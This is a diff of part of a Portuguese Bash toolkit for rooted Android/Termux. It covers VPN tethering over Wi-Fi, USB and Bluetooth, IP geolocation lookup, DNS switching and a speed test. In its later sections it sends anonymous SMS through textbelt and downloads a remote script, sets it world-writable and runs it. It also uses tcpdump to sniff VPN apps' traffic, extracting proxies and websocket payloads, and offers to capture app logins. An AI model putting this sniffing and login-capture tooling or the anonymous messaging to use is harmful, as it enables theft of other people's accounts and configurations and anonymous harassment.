+     *)su -c rm wifiip1 ; su -c ifconfig wlan0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> wifiip1;;
+     esac
+}
+check5
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "              VIA ROTEADOR WI-FI     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - Ligar"
+echo -e "            [ 2 ] - Desligar"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " Apps
+    case $Apps in  
+   1)AltRW1;;
+   2)AltRW2;;
+   0)WIFI;;
+   *) MetodoWIFI1;;
+    esac
+    }
+
+
+
+AltRW1(){
+clear
+check2() {
+    vpn=$(su -c ifconfig | grep -c tun0)
+    case $vpn in
+    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
+    1) su -c 'svc wifi disable';;
+     esac
+}
+check2
+check1() {
+    vpn=$(su -c ifconfig | grep -c wlan0)
+    case $vpn in
+    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 2" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+wifiip1=$( cat wifiip1 | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $wifiip1.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $wifiip1.0/24 dev wlan0 scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev wlan0 scope link table 61 && clear ; echo "Compartilhamento via Wi-Fi iniciado" ; sleep 5 && su -c killall com.termux
+}
+
+AltRW2(){
+clear
+check1() {
+    vpn=$(su -c ifconfig | grep -c wlan0)
+    case $vpn in
+    0) clear ; echo "Roteador Wi-Fi não está ligado" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+wifiip1=$( cat wifiip1 | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $wifiip1.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $wifiip1.0/24 dev wlan0 scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev wlan0 scope link table 61 ; clear ; echo "Compartilhamento via Wi-Fi parado" ; sleep 5 && Menu2
+}
+
+
+MetodoWIFI2(){
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+su -c 'svc wifi disable' && sleep 4
+check1() {
+    vpn=$(su -c ifconfig | grep -c swlan0)
+    case $vpn in
+    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 1" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+check5(){
+      apps=$(cat wifiip2 | grep -c .)
+    case $apps in
+     1) clear;;
+     2)clear;;
+     3)clear;;
+     4)clear;;
+     *)su -c rm wifiip2 ; su -c ifconfig swlan0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> wifiip2;;
+     esac
+}
+check5
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "              VIA ROTEADOR WI-FI     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - Ligar"
+echo -e "            [ 2 ] - Desligar"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " Apps
+    case $Apps in  
+   1)AltRW21;;
+   2)AltRW22;;
+   0)WIFI;;
+   *) MetodoWIFI2;;
+    esac
+    }
+
+
+AltRW21(){
+clear
+check2() {
+    vpn=$(su -c ifconfig | grep -c tun0)
+    case $vpn in
+    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
+    1) su -c 'svc wifi disable';;
+     esac
+}
+check2
+check1() {
+    vpn=$(su -c ifconfig | grep -c swlan0)
+    case $vpn in
+    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 1" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+wifiip2=$( cat wifiip2 | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $wifiip2.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $wifiip2.0/24 dev swlan0 scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev swlan0 scope link table 61 && clear ; echo "Compartilhamento via Wi-Fi iniciado" ; sleep 5 && su -c killall com.termux
+}
+
+AltRW22(){
+clear
+check1() {
+    vpn=$(su -c ifconfig | grep -c swlan0)
+    case $vpn in
+    0) clear ; echo "Roteador Wi-Fi não está ligado" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+wifiip2=$( cat wifiip2 | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $wifiip2.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $wifiip2.0/24 dev swlan0 scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev swlan0 scope link table 61 ; clear ; echo "Compartilhamento via Wi-Fi parado" ; sleep 5 && Menu2
+}
+
+
+USB(){
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+su -c 'svc wifi disable' && sleep 4
+check1() {
+    vpn=$(su -c ifconfig | grep -c rndis0)
+    case $vpn in
+    0) clear ; echo "Ancoragem USB não está ligada" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+check5(){
+      apps=$(cat usbip | grep -c .)
+    case $apps in
+     1) clear;;
+     2)clear;;
+     3)clear;;
+     4)clear;;
+     *)su -c rm usbip ; su -c ifconfig rndis0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> usbip ;;
+     esac
+}
+check5
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "                  VIA USB     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - Ligar"
+echo -e "            [ 2 ] - Desligar"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " Apps
+    case $Apps in  
+   1)AltRU1;;
+   2)AltRU2;;
+   0)Menu2;;
+   *) USB;;
+    esac
+    }
+
+
+AltRU1(){
+clear
+check2() {
+    vpn=$(su -c ifconfig | grep -c tun0)
+    case $vpn in
+    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
+    1) clear,;;
+     esac
+}
+check2
+check1() {
+    vpn=$(su -c ifconfig | grep -c rndis0)
+    case $vpn in
+    0) clear ; echo "Ancoragem USB não está ligada" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+usbip=$( cat usbip | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $usbip.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $usbip.0/24 dev rndis0 scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev rndis0 scope link table 61 && clear ; echo "Compartilhamento via USB iniciado" ; sleep 5 && su -c killall com.termux
+}
+
+
+AltRU2(){
+clear
+check1() {
+    vpn=$(su -c ifconfig | grep -c rndis0)
+    case $vpn in
+    0) clear ; echo "Ancoragem USB não está ligada" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+usbip=$( cat usbip | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $usbip.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $usbip.0/24 dev rndis0 scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev rndis0 scope link table 61 && clear ; echo "Compartilhamento via USB parado" ; sleep 5 && Menu2
+}
+
+
+
+Bluetooth(){
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+su -c 'svc wifi disable' && sleep 4
+check1() {
+    vpn=$(su -c ifconfig | grep -c bt-pan)
+    case $vpn in
+    0) clear ; echo "Nenhum aparelho conectado via Ancoragem Bluetooth" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+check5(){
+      apps=$(cat btip | grep -c .)
+    case $apps in
+     1) clear;;
+     2)clear;;
+     3)clear;;
+     4)clear;;
+     *)su -c rm btip ; su -c ifconfig bt-pan | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> btip;;
+     esac
+}
+check5
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "                VIA BLUETOOTH      "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - Ligar"
+echo -e "            [ 2 ] - Desligar"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " Apps
+    case $Apps in  
+   1)AltRB1;;
+   2)AltRB2;;
+   0)Menu2;;
+   *) Bluetooth;;
+    esac
+    }
+
+
+
+AltRB1(){
+clear
+check2() {
+    vpn=$(su -c ifconfig | grep -c tun0)
+    case $vpn in
+    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
+    1) clear,;;
+     esac
+}
+check2
+check1() {
+    vpn=$(su -c ifconfig | grep -c bt-pan)
+    case $vpn in
+    0) clear ; echo "Nenhum aparelho conectado via Ancoragem Bluetooth" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+btip=$( cat btip | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $btip.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $btip.0/24 dev bt-pan scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev bt-pan scope link table 61 && echo "Compartilhamento via Bluetooth iniciado" ; sleep 5 && su -c killall com.termux
+}
+
+AltRB2(){
+clear
+check1() {
+    vpn=$(su -c ifconfig | grep -c bt-pan)
+    case $vpn in
+    0) clear ; echo "Nenhum aparelho conectado via Ancoragem Bluetooth" ; sleep 4 ; Menu2;;
+    1) clear;;
+     esac
+}
+check1
+
+btip=$( cat btip | grep "1" | cut -d'.' -f1-3)
+
+su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $btip.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $btip.0/24 dev bt-pan scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev bt-pan scope link table 61 && clear ; echo "Compartilhamento via Bluetooth parado" ; sleep 5 && Menu2
+}
+
+
+
+Menu3(){
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "                    OUTROS     "
+echo "        ==================================="
+echo "               ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "            ${DESTACAR}[ 1 ] - Ver MBs Gastos ${CINZA}ROOT${NADA}"
+echo -e "            ${DESTACAR}[ 2 ] - X9 de IP"
+echo -e "            [ 3 ] - DNS Change ${CINZA}ROOT${NADA}"
+echo -e "            ${DESTACAR}[ 4 ] - SpeedTest"
+echo -e "            [ 5 ] - X9 de DDD"
+echo -e "            [ 6 ] - SMS Anônimo"
+echo -e "            [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " Apps
+    case $Apps in  
+   1)Alter1;;
+   2)Alter2;;
+   3)Alter3;;
+   4)Speed;;
+   5)DDD;;
+   6)SmsA;;
+   0)MenuPrincipal;;
+   *) Menu3;;
+    esac
+    }
+
+Alter1(){
+check() {
+    su=$(su -h | grep -c "command")
+    case $su in
+    0) killall com.termux ; clear ; exit ;;
+    1) clear;;
+    esac
+}
+check
+clear
+check2() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    0) echo "VPN não encontrada" ; sleep 4; Menu3;;
+    1) clear ; su -c am start -n com.android.vpndialogs/com.android.vpndialogs.ManageDialog && Menu3;;
+    esac
+}
+check2
+}
+
+Alter2(){
+clear
+echo -e "${DESTACAR}1 - IP Atual"
+echo -e "2 - IP Personalizado"
+echo -e "0 - Voltar ${NADA}"
+echo
+read -n1 -p "Escolha uma opção: " optione1211
+  case $optione1211 in 
+  2)clear ; read -p "DIGITE O IP: " Plain ; opiiy;;
+  1)clear ; Plain=$(curl -s ipecho.net/plain) ; echo -e "SEU IP ATUAL É: ${GREEN}$Plain${SCOLOR}" ; echo;;
+  0)Menu3;;
+  *)Alter2;;
+  esac
+
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+
+
+
+  read -n1 -p "QUER VER OS DETALHES DESSE IP? [Y/n] " optione
+  case $optione in
+  y) opiiy;;
+  Y) opiiy;;
+  *) Menu3;;
+  esac
+  }
+  
+opiiy(){
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+clear
+
+clear 
+
+IP=$(curl -s https://freegeoip.app/xml/$Plain | grep IP | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}IP:${GREEN} $IP ${SCOLOR}" ; echo 
+
+Pais=$(curl -s https://freegeoip.app/xml/$Plain | grep CountryName | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Pais:${GREEN} $Pais ${SCOLOR}" ; echo 
+
+Code=$(curl -s https://freegeoip.app/xml/$Plain | grep CountryCode | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Codigo do Pais:${GREEN} $Code ${SCOLOR}" ; echo 
+
+RegionName=$(curl -s https://freegeoip.app/xml/$Plain | grep RegionName | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Estado:${GREEN} $RegionName ${SCOLOR}" ; echo
+
+CodeReg=$(curl -s https://freegeoip.app/xml/$Plain | grep RegionCode | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Codigo do Estado:${GREEN} $CodeReg ${SCOLOR}" ; echo
+
+City=$(curl -s https://freegeoip.app/xml/$Plain | grep City | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Cidade:${GREEN} $City ${SCOLOR}" ; echo
+
+ZipCode=$(curl -s https://freegeoip.app/xml/$Plain | grep ZipCode | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Codigo Postal:${GREEN} $ZipCode ${SCOLOR}" ; echo
+
+FusoHorario=$(curl -s https://freegeoip.app/xml/$Plain | grep TimeZone | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Fuso Horario:${GREEN} $FusoHorario ${SCOLOR}" ; echo
+
+Latitude=$(curl -s https://freegeoip.app/xml/$Plain | grep Latitude | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Latitude:${GREEN} $Latitude ${SCOLOR}" ; echo
+
+Longitude=$(curl -s https://freegeoip.app/xml/$Plain | grep Longitude | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Longitude:${GREEN} $Longitude ${SCOLOR}"
+
+echo
+ read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)Menu3;;
+  esac
+}
+
+DDD(){
+clear
+clear ; read -p "DIGITE O DDD: " ddd1
+echo
+PuxarDDD=$(curl -s https://www.guialince.com.br/ddd/$ddd1)
+Estado=$(echo "$PuxarDDD" | grep "/ddd/" | cut -d'>' -f7 | grep "/td" | grep "</td" | cut -d'<' -f1)
+
+Cidade=$(echo "$PuxarDDD" | grep "/ddd/" | cut -d'>' -f4 | grep "/a" | grep "</a" | cut -d'<' -f1)
+
+DDDQuanti=$(echo "$Cidade" | wc -l)
+case $DDDQuanti in
+1)echo -e "${RED}NENHUMA CIDADE ENCONTRADA COM ESSE DDD${NADA}";;
+*)echo -e "${DESTACAR}NUMERO DE CIDADES ENCONTRADAS: $DDDQuanti${NADA}"
+echo
+for i in $(seq $DDDQuanti)
+do
+CidadeEnd=$(echo "$Cidade" | sed -n "$i"p)
+EstadoEnd=$(echo "$Estado" | sed -n "$i"p) 
+echo -e "${YELLOW}$CidadeEnd${NADA} | ${GREEN}$EstadoEnd${NADA}"
+done
+;;
+esac
+
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)Menu3;;
+  esac
+}
+
+SmsA(){
+clear
+read -p "DIGITE O DDD+NUMERO: " smsnumero
+echo
+read -p "DIGITE UMA MENSAGEM: " smsmensagem
+echo
+SMSenvio=$(curl -s -X POST https://textbelt.com/text --data-urlencode phone="+55 $smsnumero" --data-urlencode message="$smsmensagem" -d key=textbelt)
+
+smsresponse1=$(echo "$SMSenvio" | grep -i -c "true")
+case $smsresponse1 in
+1)echo -e "${GREEN}MENSAGEM ENVIADA COM SUCESSO${NADA}"; voltar111 ;;
+0);;
+esac
+
+smsresponse3=$(echo "$SMSenvio" | grep -i -c "Your phone number was not provided")
+case $smsresponse3 in
+1)echo -e "${RED}OCORREU UM ERRO, VERIFIQUE SEU NUMERO${NADA}" ;voltar111;;
+0);;
+esac
+
+smsresponse2=$(echo "$SMSenvio" | grep -i -c "Only one test text message is allowed per day")
+case $smsresponse2 in
+1)echo -e "${YELLOW}LIMITE DE MENSAGENS DIARIAS EXCEDIDO${NADA}" ;voltar111;;
+0);;
+esac
+
+
+smsresponse4=$(echo "$SMSenvio" | grep -i -c "false")
+case $smsresponse4 in
+*)echo -e "${YELLOW}OCORREU UM ERRO DESCONHECIDO${NADA}";;
+esac
+voltar111
+}
+voltar111(){
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)Menu3;;
+  esac
+}
+
+
+
+
+Alter3(){
+check() {
+    su=$(su -h | grep -c "command")
+    case $su in
+    0) killall com.termux ; clear ; exit ;;
+    1) clear;;
+    esac
+}
+check
+   clear
+echo -e '\n'
+echo "     ==================================="
+echo "                CHANGE DNS (ROOT)     "
+echo "         ===================================" 
+echo "                 ESCOLHA UM DNS"
+echo
+echo "        ==================================="
+echo -e "              ${DESTACAR}[ 1 ] - CloudFire DNS"
+echo -e "              [ 2 ] - OpenDNS"
+echo -e "              [ 3 ] - Google DNS"
+echo -e "              [ 4 ] - Ad Guard DNS"
+echo -e "              [ 5 ] - DNS Watch"
+echo -e "              [ 6 ] - GIGA DNS"
+echo -e "              [ 7 ] - Clean Browsing DNS"
+echo -e "              [ 8 ] - Quad9 DNS"
+echo -e "              [ 9 ] - DNS Personalizado"
+echo -e "              [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo 
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in
+    1) d1="1.1.1.1" ; d2="1.0.0.1" ; d3="2606:4700:4700::1111" ; d4="2606:4700:4700::1001" ; d5="1.1.1.1" ; d6="1.0.0.1" ; nome="CloudFire DNS";;
+    2) d1="208.67.222.222" ; d2="208.67.220.220" ; d3="2620:119:35::35" ; d4="2620:119:53::53" ; d5="208.67.222.222" ; d6="208.67.220.220" ; nome="OpenDNS" ;;
+    3) d1="8.8.8.8" ; d2="8.8.4.4" ; d3="2001:4860:4860::8888" ; d4="2001:4860:4860::8844" ; d5="8.8.8.8" ; d6="8.8.4.4" ; nome="Google Public DNS" ;;
+    4) d1="176.103.130.130" ; d2="176.103.130.131" ; d3="2a10:50c0::ad1:ff" ; d4="2a10:50c0::ad2:ff" ; d5="176.103.130.130" ; d6="176.103.130.131" ; nome="Ad Guard DNS";;
+    5) d1="84.200.69.80" ; d2="84.200.70.40" ; d3="2001:1608:10:25::1c04:b12f" ; d4="2001:1608:10:25::9249:d69b" ; d5="84.200.69.80" ; d6="84.200.70.40" ; nome="DNS Witch" ;;
+    6) d1="189.38.95.95" ; d2="189.38.95.96" ; d3="2804:10:10::10" ; d4="2804:10:10::20" ; d5="189.38.95.95" ; d6="189.38.95.96" ; nome="GIGA DNS";;
+    7) d1="185.228.168.9" ; d2="185.228.169.9" ; d3="2a0d:2a00:1::2" ; d4="2a0d:2a00:2::2" ; d5="185.228.168.9" ; d6="185.228.169.9" ; nome="Clean Browsing DNS" ;;
+    8) d1="9.9.9.9" ; d2="149.112.112.112" ; d3="2620:fe::fe" ; d4="2620:fe::9" ; d5="9.9.9.9" ; d6="149.112.112.112" ; nome="Quad9 DNS" ;;
+    9) App9;;
+    0) Menu3;;
+    *) Alter3;;
+    esac
+    connectdns
+    }
+
+App9(){
+clear
+ echo -e "ㅤㅤㅤ \emDigite o DNS Primario\em"
+read d1
+echo
+echo -e "ㅤㅤ   \emDigite o DNS Secundario\em"
+read d2
+echo
+echo -e "ㅤ     \emDigite o IPv6 Primario\em"
+read d3
+echo
+echo -e "ㅤ     \emDigite o IPv6 Secundario\em"
+read d4
+echo ""
+connect
+}
+
+connectdns () {
+clear
+su -c setprop net.dns1 $d1 && su -c setprop net.dns2 $d2 && su -c setprop net.dns3 $d3 && su -c setprop net.dns4 $d4 && su -c setprop net.rmnet0.dns1 $d1 && su -c setprop net.rmnet0.dns2 $d2 && clear && sleep 1 && echo "SEU DNS FOI ALTERADO PARA:" && sleep 1 && echo && echo "    $nome" && sleep 1 && echo && echo "DNS PRIMARIO:" && su -c getprop net.dns1 && sleep 1 && echo && echo "DNS SECUNDARIO:" && su -c getprop net.dns2 && sleep 1 && echo && echo "IPv6 PRIMARIO:" && su -c getprop net.dns3 && sleep 1 && echo && echo "IPv6 SECUNDARIO:" && su -c getprop net.dns4 && echo && echo
+ read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)Menu3;;
+  esac
+}
+
+Speed(){
+clear
+echo "Sem internet..." && clear && curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/SpeedTest && chmod 777 SpeedTest ; clear 
+
+read -p "QUER ATUALIZAR OS PACOTES? [Y/n] " optione
+  case $optione in
+  y) pkg install python3 -y ; sleep 3 ; spd;;
+  Y) pkg install python3 -y ; sleep 3 ; spd;;
+  n) spd;;
+  N) spd;;
+  *) spd;;
+  esac
+  }
+  
+spd(){
+clear && python3 SpeedTest && echo
+
+ read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)Menu3;;
+  esac
+}
+
+
+
+
+
+
+
+Menu4(){
+check() {
+    su=$(su -h | grep -c "command")
+    case $su in
+    0) killall com.termux ; clear ; exit ;;
+    1) clear;;
+    esac
+}
+check
+read -p "QUER ATUALIZAR OS PACOTES? [Y/n] " optione
+  case $optione in
+  y) apt upgrade -y ; apt update -y && apt upgrade root-repo -y && pkg install tcpdump -y ; pkg install tsu ; sleep 3 ; X9sniffer;;
+  Y) apt upgrade -y ; apt update -y && apt upgrade root-repo -y && pkg install tcpdump -y ; pkg install tsu ; sleep 3 ; X9sniffer ;;
+  n) X9sniffer;;
+  N) X9sniffer;;
+  *) Menu4;;
+  esac
+  }
+X9sniffer(){
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "                  X9 DE ARQUIVOS     "
+echo "         ===================================" 
+echo "                ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "              ${DESTACAR}[ 1 ] - WebSocket Direct"
+echo -e "              [ 2 ] - WS Payload + SSL"
+echo -e "              [ 3 ] - V2Ray"
+echo -e "              [ 4 ] - Direct"
+echo -e "              [ 5 ] - Sniffar Tudo"
+echo -e "              [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo 
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+    read -n1 -p "Escolha uma Opção: " App
+    case $App in
+    1)wsDirect;;
+    2)wspayssl;;
+    3)V2Ray;;
+    4)direct;;
+    5)SniffarAll;;
+    0)MenuPrincipal;;
+    *)X9sniffer;;
+    esac
+    }
+    
+    
+   
+    
+wsDirect(){
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+Sniffer1
+}
+Sniffer1(){
+clear
+check7() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
+    0) clear;;
+     esac
+}
+check7
+clear
+
+echo -e "${DESTACAR}1 - Escolher Porta${NADA} ${CINZA}CAPTURA QUALQUER PROXY${NADA}"
+echo -e "${DESTACAR}2 - Todas as Portas${NADA} ${CINZA}CAPTURA PROXYS COM INICIO ${NADA}104"
+echo
+read -n1 -p "Escolha uma Opção: " ComSemPorta
+case $ComSemPorta in
+1)ComPorta;;
+2)TodasPortas;;
+*)Sniffer1;;
+esac
+}
+
+ComPorta(){
+clear
+su -c rm -f proxycriar.txt
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+su -c rm -f proxy.txt
+clear
+echo -e "${DESTACAR}Ex: 80, 443, 8080, 8880, etc ${NADA}"
+echo
+read -p "ESCOLHA UMA PORTA: " Porta
+
+clear
+
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"
+
+Sniff=$(su -c tcpdump -c10 port ${Porta} -n -A)
+echo -e "$Sniff" >> sniffer.txt
+
+Proxys=$(cat sniffer.txt | grep -a ">" | cut -d'>' -f2 | cut -d'.' -f1-5 | cut -d':' -f1)
+echo -e "$Proxys" >> proxycriar.txt
+
+ProxyCreate=$(cat proxycriar.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-5) && echo -e "$ProxyCreate" >> proxy.txt
+clear
+
+Proxy=$(cat proxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4 | grep -a -n . | grep -a 1: | cut -d':' -f2)
+
+Port=$(cat proxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 )
+
+P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
+P2=$(cat sniffer.txt | grep -a Host)
+P3=$(cat sniffer.txt | grep -a Upgrade)
+
+
+check2() {
+    P13=$(cat sniffer.txt | grep -c websocket -i)
+    case $P13 in
+    0) echo "NADA ENCONTRADO NESSA PORTA" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac;;
+    1) clear;;
+     esac
+}
+check2
+echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
+echo
+
+echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
+echo -e "${GREEN}$P2${SCOLOR}"
+echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
+echo 
+echo -e "${GREEN}Proxy:$Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Port${SCOLOR}"
+echo 
+echo -e "${DESTACAR}PAYLOAD: ${NADA}"
+echo
+
+echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
+
+echo
+read -p "QUER VER OS DETALHES? [Y/n]" optione12
+  case $optione12 in
+  y)cat sniffer.txt ; PegarinfoWSDirect11;;
+  Y)cat sniffer.txt ; PegarinfoWSDirect11;;
+  *)Verlogin1;;
+  esac
+}
+PegarinfoWSDirect11(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoWSDirect22;;
+  Y)PegarinfoWSDirect22;;
+  *)Verlogin1;;
+  esac
+}
+PegarinfoWSDirect22(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+PegarinfoWSDirect33
+}
+PegarinfoWSDirect33(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoWSDirect22;;
+  Y)PegarinfoWSDirect22;;
+  *)Verlogin1;;
+  esac
+}
+Verlogin1(){
+echo
+read -n1 -p "QUER TENTAR CAPTURAR O LOGIN EM ALGUNS APPS [Y/n]" optione1
+  case $optione1 in
+  N)X9sniffer;;
+  n)X9sniffer;;
+  y)logindirect;;
+  Y)logindirect;;
+  *)X9sniffer;;
+  esac
